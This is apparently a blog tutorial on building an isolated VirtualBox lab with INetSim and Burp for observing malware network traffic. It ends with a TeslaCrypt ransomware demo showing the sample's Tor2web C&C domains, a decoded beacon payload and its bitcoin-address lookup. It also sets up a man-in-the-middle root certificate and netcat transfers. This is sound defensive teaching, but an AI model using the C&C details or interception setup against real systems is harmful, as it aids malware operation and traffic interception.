We’ll create an isolated\n**virtual network separated from the host OS and from the Internet, in which we’ll setup two**\nvictim virtual machines (Ubuntu and Windows 7) as well as an analysis server to mimic\ncommon Internet services like HTTP or DNS. Then, we’ll be able to log and analyze the\nnetwork communications of any Linux or Windows malware, which will unknowingly connect\nto our server instead of the Internet. We demonstrate the setup with a real life use\n[case where we analyze the traffic of the infamous TeslaCrypt ransomware, a now defunct](https://en.wikipedia.org/wiki/TeslaCrypt)\nransomware which infected a large number of systems from 2015 to mid-2016.\n\nDiagram of our future setup. Note that the machines in the virtual network will be isolated\nfrom the host OS and will not be able to connect to the Internet.\nThis guide includes quite a lot of material, so here’s a table of contents to give you an\noverview of what we’ll cover and let you jump directly to a section if you’d like.\n\n## 1. Creating the virtual machines\n\nHere are two links you can use to download Ubuntu and Windows 7 virtual machine images.\n\n**Ubuntu (victim machine 1 and analysis machine): download Ubuntu 16.10 64 bits**\nfrom [OsBoxes (direct link)](https://www.osboxes.org/ubuntu/)\n**Windows 7 (victim machine 2): download from the Microsoft Developer**\nWebsite (select IE 11 on Win 7 (x86) and VirtualBox)\n\nTip: if you already have an Ubuntu virtual machine you’re not using, you can simply clone it\nand reuse it in the next steps (right click > Clone).\n\n\n-----\n\nBefore starting, make sure you have enough disk space available (I d recommend at least\n10-20 GB).\n\n### Base Ubuntu machine\n\nOsBoxes provides us with a ready-to-go virtual disk that we can simply plug on a VM and\nstart using right away. Start by extracting the archive you just downloaded.\n```\n$ 7za e Ubuntu_16.10_Yakkety-VB-64bit.7z\n\n```\nYou’ll be provided with a VDI file representing the virtual disk of the machine. We’ll start by\nsetting up the base Ubuntu image, which we will then clone to have our two Ubuntu VMs.\n\nIn VirtualBox, create a new machine (New button), and call it Ubuntu analysis. Then,\nselect how much RAM you want to give it. At this point, VirtualBox will ask you if you wish to\ncreate a new virtual hard disk or use an already exiting one. Select Use an existing virtual\n**hard disk file, click on the directory icon at the right of the dropdown list, and select the VDI**\nfile.\n\nYou can then power up the machine. The default password is osboxes.org.\n\n**Basic setup**\n\nThe default keyboard uses the QWERTY layout. If like me you’re not familiar with it, start by\nchanging it (Settings > Text Entry).\n\nOptionally, you can also change the default password using:\n```\n$ passwd osboxes\n\n```\nIt can also be a good idea to update your packages.\n```\n$ sudo apt-get update\n$ sudo apt-get upgrade\n\n```\n**Install the guest additions**\n\nSelect Devices > Insert guest additions CD image in the menu of the window in which the\nVM runs. You will then be asked if you want to run the installer; answer yes, and enter the\ndefault password (by default osboxes.org). Once the installation is complete, power off the\nVM.\n\n**Cloning**\n\nNow that you have a basic Ubuntu VM ready to go, clone it (right click on it in the main\nVirtualBox interface > Clone). Name the clone Ubuntu victim, and check the checkbox to\nreinitialize its MAC address. Select Full clone for the type of clone.\n\n\n-----\n\nThe two Ubuntu VMs created\n\n### Windows 7 machine\n\nThe download link I provided earlier points to a ZIP archive containing a OVA file. Unlike a\nVDI file it’s not only a virtual disk, but a full description of the virtual machine (including its\nvirtual disk), so the only thing you need to do to create a virtual machine from it is to\nselect File > Import Appliance in the main window of VirtualBox. If you can afford it, it’s\nprobably better to give it at least 1024 MB of RAM.\n\nOnce the import process is complete (it can take a few minutes), rename the VM Windows\n**7 victim and power it on.**\n\n**Install the guest additions**\n\nSelect Devices > Insert guest additions CD image in the menu of the window in which the\nVM runs, and run the installer from the virtual CD which has been inserted. When you’re\ndone, power off the machine.\n\n## 2. Setup of the analysis machine: INetSim, Burp\n\n### INetSim\n\n[INetSim is a very handy and powerful utility that allows to simulate a bunch of standard](http://www.inetsim.org/index.html)\nInternet services on a machine. By default, it will among others emulate a DNS, HTTP and\nSMTP that you can easily tune. Since we’ll later configure our victim machines to have no\nInternet access, we will need INetSim to simulate it.\n\n[There are several ways to install INetSim. The easiest is to run the following commands (in](http://www.inetsim.org/downloads.html)\nthe analysis machine).\n```\n$ sudo su\n$ echo \"deb http://www.inetsim.org/debian/ binary/\" >\n/etc/apt/sources.list.d/inetsim.list\n$ wget -O - http://www.inetsim.org/inetsim-archive-signing-key.asc | apt-key add $ apt update\n$ apt install inetsim\n\n```\nNote: in order to be able to copy-paste those commands in your analysis machine,\nselect Devices > Shared Clipboard > Bidirectional.\n\n\n-----\n\nWe ll come back later on how to use INetSim.\n\n### Burp\n\nUnfortunately, it seems that INetSim’s SSL support is quite limited: it comes with a certificate\nfor a single host (inetsim.org) and doesn’t support generating SSL certificates on the fly. This\nis a problem since most malwares nowadays encrypt their communications with SSL. We’ll\nuse Burp as a transparent SSL proxy, which will stand in the middle of the victim machines\nand INetSim for SSL connections. If you don’t need to intercept SSL traffic for now, you won’t\nnecessarily need Burp.\n\nBurp supports generating on-the-fly SSL certificates for any our victim machines will connect\nto. It also creates a single root CA certificate, that we’ll later import in our victim machines.\nThis way, we’ll be able to intercept the encrypted communications that our malware sends.\n\n[You can download Burp from the official website. The download is a bash installation script,](https://portswigger.net/burp/freedownload/)\nrun it to install Burp:\n```\n$ bash ~/Downloads/burpsuite_free_linux_v1_7_23.sh\n\n```\nBy default, the Burp executable will be ~/BurpSuiteFree/BurpSuiteFree.\n\n## 3. Setting up an isolated virtual network\n\nAs a reminder, we want to set up an isolated network containing our three VMs. This network\nwill not be able to access the Internet. Also, we want the analysis machine to act as a\nnetwork gateway to the victim machines in order to easily be able to intercept the network\ntraffic and to simulate various services such as DNS or HTTP.\n\nIn order to achieve this, we will use a VirtualBox Internal Network. For those familiar with\nVirtualBox, an internal network differs from a host-only network in that an internal network\ncannot access the host machine at all.\n\nFor each of your three virtual machines, do the following:\n\nOpen its settings\nGo to the Network section\nChange the Attached to field to Internal network\nEnter malware-analysis-network as the network name\n\n\n-----\n\nNetwork configuration\n\n### Analysis machine\n\nPower on the analysis machine, open a terminal, and run the ifconfig command. You should\nhave an interface named enp0s3. If the name differs, just adapt it in the instructions to\nfollow.\n\nOpen the file /etc/network/interfaces as root, and add the following at the end:\n```\nauto enp0s3\niface enp0s3 inet static\n address 10.0.0.1\n netmask 255.255.255.0\n\n```\nThis will assign the machine the static IP 10.0.0.1 on our virtual network. Now that we have\nconfigured the network interface, we need to start it up using:\n```\n$ sudo ifup enp0s3\n\n### Ubuntu victim machine\n\n```\nThe process is very similar here, except that we’ll assign it the static IP 10.0.0.2, and instruct\nit to use 10.0.0.1 as a gateway and as a DNS server. Append the following at the end of the\nfile /etc/network/interfaces :\n```\nauto enp0s3\niface enp0s3 inet static\n address 10.0.0.2\n gateway 10.0.0.1\n netmask 255.255.255.0\n dns-nameservers 10.0.0.1\n\n```\nAnd run:\n```\n$ sudo ifup enp0s3\n$ sudo service networking restart\n\n```\nYou should now be able to ping the analysis machine:\n\n\n-----\n\n```\n$ ping 10.0.0.1\nPING 10.0.0.1 (10.0.0.1) 56(84) bytes of data.\n64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=0.480 ms\n64 bytes from 10.0.0.1: icmp_seq=2 ttl=64 time=0.526 ms\n\n### Windows 7 victim machine\n\n```\nRight-click on the network icon in the taskbar (or go to Start Menu > Control Panel >\n**Network and Internet > Network and Sharing center), click on Local Area Connection 2**\n\n**> Properties, select on Internet Protocol Version 4, and click on the Properties button.**\n\nWe’ll assign the static IP 10.0.0.3 to the machine, and configure the rest similarly to the\nUbuntu victim machine.\n\nNetwork settings\n\nMake sure to validate the settings (click on OK, Apply, etc. until all the settings windows are\ngone). You should now be able to ping the analysis machine:\n```\n> ping 10.0.0.1\nPinging 10.0.0.1 with 32 bytes of data:\nReply from 10.0.0.1: bytes=32 time<1ms TTL=64\nReply from 10.0.0.1: bytes=32 time<1ms TTL=64\n\n```\nAll set!\n\n\n-----\n\n## 4. Creating and restoring snapshots\n\nNow that our victim VMs are properly configured and are in a clean state (i.e. not infected by\nany kind of malware), we are going to make a snapshot of their current state. This way, we\nwill be able to easily reset them to this clean state at any point time.\n\nVirtualBox makes this very easy: in the window in which the VM is running, just select\n**Machine > Take Snapshot. You can name the snapshot Clean state. Make sure to do this**\nfor both your Ubuntu and Windows 7 victim machines. It doesn’t hurt to do it for your analysis\nmachine as well.\n\nWhen you’ll want to reset a machine to its clean state, simply power it off and check the\ncheckbox Restore current snapshot ‘Clean state’.\n\n## 5. Using INetSim and Burp on the analysis machine to analyze the network traffic\n\n### INetSim\n\nAs previously mentioned, INetSim enables us to wide range of standard Internet services\nincluding DNS, HTTP(S), SMTP, etc. It has a default configuration\nfile /etc/inetsim/inetsim.conf which is very well documented. It also ships with a data\ndirectory (/var/lib/inetsim) containing various default files.\n\nSince you’ll probably want a different INetSim configuration each time you make a new\nanalysis, I suggest you create a directory analysis which will contain a sub directory for each\nanalysis.\n```\n$ mkdir analysis\n\n```\nWe’ll already create a sub directory for the sake of example, and copy the default INetSim\nconfiguration file and data folder in it.\n\n\n-----\n\n```\n$ mkdir analysis/test analysis\n$ cp /etc/inetsim/inetsim.conf analysis/test-analysis\n$ sudo cp -r /var/lib/inetsim analysis/test-analysis/data\n$ sudo chmod -R 777 data\n$ cd analysis/test-analysis\n\n```\nBy default, INetSim listens on the local interface only. To make it available to all the machines\nof our virtual network, replace the following line in the configuration file we just copied:\n```\n#service_bind_address  10.0.0.1\n\n```\nBy:\n```\nservice_bind_address  0.0.0.0\n\n```\nNow, we need to disable systemd-resolved, which is a local DNS server shipped by default\nwith Ubuntu and will conflict with INetSim’s DNS server.\n```\n$ sudo systemctl disable systemd-resolved.service\n$ sudo service systemd-resolved stop\n\n```\nBy default, INetSim’s DNS server will resolve all the domain names to 127.0.0.1. We want\nany domain name to resolve to 10.0.0.1 (the analysis machine IP) instead; uncomment the\nfollowing line:\n```\n#dns_default_ip  10.0.0.1\n\n```\nI mentioned earlier that INetSim’s SSL support is not optimal since it only has a single\ncertificate for a single hostname (inetsim.org) and doesn’t allow to generate per-host\ncertificates on the fly. To overcome that, we’ll run Burp on port 443 as a transparent proxy in\nfront of INetSim. Therefore, we need to bind INetSim’s HTTPS server to a different port, say\nport 8443. Replace the following line:\n```\n#https_bind_port 443\n\n```\nBy:\n```\nhttps_bind_port 8443\n\n```\nNow, let’s run INetSim!\n\n\n-----\n\n```\n$ sudo inetsim data data conf inetsim.conf\nINetSim 1.2.6 (2016-08-29) by Matthias Eckert & Thomas Hungenberg\n[...]\n=== INetSim main process started (PID 3605) ===\nSession ID: 3605\nListening on: 0.0.0.0\nReal Date/Time: 2017-06-04 12:58:07\nFake Date/Time: 2017-06-04 12:58:07 (Delta: 0 seconds)\n Forking services...\n * dns_53_tcp_udp - started (PID 3621)\n * irc_6667_tcp - started (PID 3631)\n * daytime_13_tcp - started (PID 3638)\n * discard_9_tcp - started (PID 3642)\n * discard_9_udp - started (PID 3643)\n * ident_113_tcp - started (PID 3634)\n * syslog_514_udp - started (PID 3635)\n[...]\n\n```\nAs you can see, INetSim has launched a bunch of network services. Those are all\nconfigurable and can be disabled in the configuration file. This configuration file is very well\ndocumented and explains all the options of INetSim; I recommend you take a few minutes to\nread it.\n\nNow, power on of your victim VM, open a web browser, and browse to any address (e.g.\ngithub.com). You should see the following:\n\n\n-----\n\n_(Note that this default file corresponds to the HTML file data/http/fakefiles/sample.html.)_\n\nBack on the analysis machine, shut down INetSim (CTRL + C).\n```\n* dns_53_tcp_udp - stopped (PID 3621)\n* irc_6667_tcp - stopped (PID 3631)\n* daytime_13_tcp - stopped (PID 3638)\n[...]\nSimulation stopped.\n Report written to '/var/log/inetsim/report/report.3877.txt' (24 lines)\n\n```\nAs you can see, INetSim has created a summary report for us. It contains all the interactions\nour victim machine had with INetSim services.\n\n\n-----\n\n```\n  Report for session 3877 \nReal start date : 2017-06-04 13:18:27\nSimulated start date : 2017-06-04 13:18:27\nTime difference on startup : none\n2017-06-04 13:18:38 First simulated date in log file\n2017-06-04 13:18:40 DNS connection, type: A, class: IN, requested name: github.com\n2017-06-04 13:18:40 HTTP connection, method: GET, URL: http://github.com/, file name:\ndata/http/fakefiles/sample.html\n2017-06-04 13:18:40 HTTP connection, method: GET, URL: http://github.com/favicon.ico,\nfile name: data/http/fakefiles/sample.html\n2017-06-04 13:18:40 Last simulated date in log file\n\n### Burp for SSL interception\n\n```\nTo be able to analyze the SSL traffic, we also need to run Burp. We’ll run it as a transparent\nproxy in front of INetSim. When a victim machine will initiate a SSL connection, it will first go\nto Burp, which will then proxy it to INetSim. This section is not mandatory: if you don’t need\n_to intercept SSL traffic right now, just jump to the next section._\n\nHere’s how it will look like with Burp in the middle:\n\nStart Burp as root:\n```\n$ sudo /home/osboxes/BurpSuiteFree/BurpSuiteFree\n\n```\n(We need to run it as root otherwise it won’t be able to bind port 443, which is a privileged\nport. There are other ways to do this, but let’s not bother here)\n\nCreate a temporary project (you don’t have any other options with the free version anyway),\nand go to the Proxy tab, then to the Options sub-tab. You’ll see Burp’s default listener\nlistening on port 8080.\n\n\n-----\n\nClick on the row corresponding to the default listener, and edit it (Edit) button. Configure it as\nfollows:\n\n**Binding tab**\n\nBind to port: 443\nBind to address: all interfaces\n**Request handling tab:**\n\nRedirect to host: localhost\nRedirect to port: 8443\nCheck Support invisible proxying\n\nValidate the settings, and you should get a listener similar to:\n\nBy default, Burp intercepts the incoming requests and waits for you to explicitly let them pass\nthrough. To avoid this, go to the Intercept tab and click the button Intercept is on to disable\nit.\n\nSince Burp Free doesn’t allow you to save a project, you can export the settings we just\nmade in order to import them next time you start Burp. To do this, use Burp > Project\n**options > Save project options.**\n\nLet’s make sure our setup if correctly working Start INetSim and run:\n\n\n-----\n\n```\n$ curl insecure https://localhost\n\n```\nYou should get:\n```\n<html>\n <head>\n <title>INetSim default HTML page</title>\n </head>\n <body>\n <p></p>\n <p align=\"center\">This is the default HTML page for INetSim HTTP server fake mode.\n</p>\n <p align=\"center\">This file is an HTML document.</p>\n </body>\n</html>\n\n```\n**Importing Burp’s CA certificate on our victim machines**\n\nPower on your Windows 7 victim machine, and try to browse to a HTTPS URL (e.g.\nhttps://github.com), you’ll see a warning similar to:\n\nThis is because Burp generates a SSL certificate signed by its own CA certificate, which our\nvictim machine doesn’t trust for now.\n\nIn Burp, add a new proxy listener on port 8080, listening on all interfaces (tab Proxy >\n**Options > button Add):**\n\n\n-----\n\nThen, from the victim machine, browse to http://10.0.0.1:8080.\n\nClick on CA Certificate in the top-right corner to download Burp’s CA certificate.\n\nOn the Windows 7 victim machine: open the file, click Install certificate >Next > Place all\n**certificates in the following store: Trusted Root Certification Authorities > Next**\n\nOn the Ubuntu victim machine:\n\nConvert the certificate to the appropriate format (.crt) using\n```\n   $ openssl x509 -in ~/Downloads/cacert.der -inform DER -out burp.crt\n\n```\nCopy it to /usr/local/share/ca-certificates\n```\n   $ sudo cp burp.crt /usr/local/share/ca-certificates/\n\n```\nRun\n```\n   $ sudo update-ca-certificates\n\n```\nFirefox by default doesn’t use the system’s certificate store. If you want the SSL\nconnection to work properly in Firefox as well, go to the Firefox settings\ninto Advanced > Certificates > Import. Choose burp.crt, check Trust this CA to\n**identify websites**\n\nAll set!\n\n\n-----\n\nOnce you imported Burp s CA certificate in the victim machines, make sure to create a new\nsnapshot (e.g. Clean state with Burp’s CA certificate installed).\n\n### 6. Setting up a shared folder between the analysis machine and the host OS\n\nAt some point, you’ll obviously want to transfer some files to the analysis machine or to one\nof the victim machine; we’ll set up a file share to achieve it.\n\nIn the VirtualBox running the analysis machine, go to Devices > Shared Folders > Shared\n**folders settings. Create a new shared folder, choose the local folder of your host OS it**\nshould be mapped to, and choose a name. Check the checkbox to make it permanent.\n\nNow on the analysis machine, mount the shared folder:\n```\n$ mkdir ~/malware-analysis-share\n$ sudo mount -t vboxsf -o uid=$UID,gid=$(id -g) malware-analysis-share ~/malwareanalysis-share\n\n```\nAnd you’re good to go. In my case, all the files of my host machine located in\n/home/christophetd/malware-analysis-share will also end up in ~/malware-analysis-share in\nthe analysis machine.\n\n### Transferring files to a victim machine\n\nAt some point, you’ll most probably need to transfer some files (e.g. malware samples) to\none of the victim machines. Setting up a file share for them is a bad idea, because it means\nthe victim machine (and by extent, the malware sample you’re running on it) have access to\nit.\n\nThe simplest way to achieve a file transfer to the Ubuntu victim machine is to use netcat.\nHere’s a quick example.\n\n\n-----\n\n```\n# Receiving machine having IP 10.0.0.2\n$ nc -lvp 4444 > file.exe\n# Analysis machine (sender)\n$ cat file_to_transfer.exe | nc 10.0.0.2 4444\n\n```\nFor a Window victim, we unfortunately don’t have netcat available. Alternatives might exist,\nbut they probably don’t ship by default. One option is to use INetSim to serve your file to the\nvictim machine.\n```\n# inetsim.conf\n# Remove the default line: http_fakefile      exe   sample_gui.exe x-msdosprogram\n# Replace it by\nhttp_fakefile      exe   file_to_transfer.exe x-msdos-program\n# And put file_to_transfer.exe in ./data/http/fakefiles\n\n```\nWith this of configuration, just browse any URL ending with a ‘.exe’ (e.g.\nhttp://github.com/file.exe).\n\n## 7. Demo time: the TeslaCrypt ransomware\n\n[Time for a quick demo! I downloaded a sample of the ransomware TeslaCrypt, transferred it](https://en.wikipedia.org/wiki/TeslaCrypt)\nto our Windows 7 victim machine, and executed it. After a few seconds, all the files of the\nVM have been encrypted and the following window pops-up.\n\n\n-----\n\nTeslaCrypt main window (click for full-size image)\n\n\n-----\n\nThe machine’s files have been encrypted and replaced by files with the ECC extension\nAfter checking the logs of INetSim, we can see that the ransomware did the following DNS\nlookups:\n\n7tno4hib47vlep5o.tor2web.org\n7tno4hib47vlep5o.tor2web.blutmagie.de\n7tno4hib47vlep5o.tor2web.fi\nbitcoin.toshi.io\n\nAnd sent several HTTP requests to those domains.\n\n\n-----\n\n```\nHTTPS connection, method: GET, URL: https://7tno4hib47vlep5o.tor2web.org/state.php?\nU3ViamVjdD1QaW5nJmtleT0xNUIzOEIxOEFGMjBDMERCMkE3Qzc3MUUwMTQzNjNGMkNCODc4MUIxNTZENTE5Q0\nHTTPS connection, method: GET, URL:\nhttps://7tno4hib47vlep5o.tor2web.blutmagie.de/state.php?\nU3ViamVjdD1QaW5nJmtleT0xNUIzOEIxOEFGMjBDMERCMkE3Qzc3MUUwMTQzNjNGMkNCODc4MUIxNTZENTE5Q0\nHTTPS connection, method: GET, URL: https://7tno4hib47vlep5o.tor2web.fi/state.php?\nU3ViamVjdD1QaW5nJmtleT0xNUIzOEIxOEFGMjBDMERCMkE3Qzc3MUUwMTQzNjNGMkNCODc4MUIxNTZENTE5Q0\nHTTPS connection, method: GET, URL:\nhttps://bitcoin.toshi.io/api/v0/addresses/1LNUF3BqL3ob1CT2aVp3cW4Nb8zkkViVwT\n\n```\nWe see similar requests are made to tor2web.org, tor2web.blutmagie.de and tor2web.fi.\nThose services allow to access the Tor network without having to install Tor Browser or a\nsimilar tool.\n\nThe malware contacts the Tor hidden service 7tno4hib47vlep5o.onion, which is probably\n[some kind of C&C server. The payload of the request is a base64 encoded string, which](https://en.wikipedia.org/wiki/Command_and_control_(malware))\ndecodes to:\n```\nSubject=Ping\n&key=15B38B18AF20C0DB2A7C771E014363F2CB8781B156D519CC5F220335D4714AA3\n&addr=1LNUF3BqL3ob1CT2aVp3cW4Nb8zkkViVwT\n&files=0\n&size=0\n&version=0.2.6a\n&date=1496648675\n&OS=7601\n&ID=16\n&subid=0\n&gate=G1\n\n```\nIt also makes an API call to bitcoin.toshio.io (which doesn’t exist anymore), most probably\nto check if the ransom has been paid to the bitcoin\naddress 1LNUF3BqL3ob1CT2aVp3cW4Nb8zkkViVwT. It seems like the malware generates\nan unique bitcoin address for each infected computer, since the address didn’t receive or\nsend out any money.\n\n## Conclusion\n\nHopefully this guide will be helpful and allow you to safely analyze the network interactions of\na malware. Keep in mind that some malwares detect when they are being run in a virtual\nmachine and might adapt their behavior (e.g. do nothing). Here’s an article from\nMalwareBytes on the subject.\n\nAlso, remember that while analyzing a malware’s network traffic can be very useful, it’s only\none kind of dynamic analysis. Others include monitoring the register, the system calls, the\nfiles opened / created, etc. Open Security Training offers [a full hands-on course on the topic,](http://opensecuritytraining.info/MalwareDynamicAnalysis.html)\n\n\n-----\n\nfor free.\n\nDon’t hesitate to leave a comment if you found this guide useful / awesome / too long / too\n[detailed.
